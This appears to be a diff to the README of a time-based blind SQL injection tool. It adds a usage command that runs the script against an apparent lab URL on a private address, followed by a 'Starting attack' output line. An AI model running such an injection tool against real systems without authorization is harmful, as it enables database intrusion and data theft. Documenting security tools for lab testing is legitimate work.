@@ -1,5 +1,8 @@
 # Time Based Blind SQL Injection Tool
 
+```console
+python time_based_blind_sql_injection.py -u "http://192.168.33.10/sqli/time_based_blind_escaped.php" -m "POST" -d "{'to':'1','msg':'message'}" -t 4 -l
+```
 
 * Starting attack on URL: http://192.168.33.10/sqli/time_based_blind_escaped.php
 
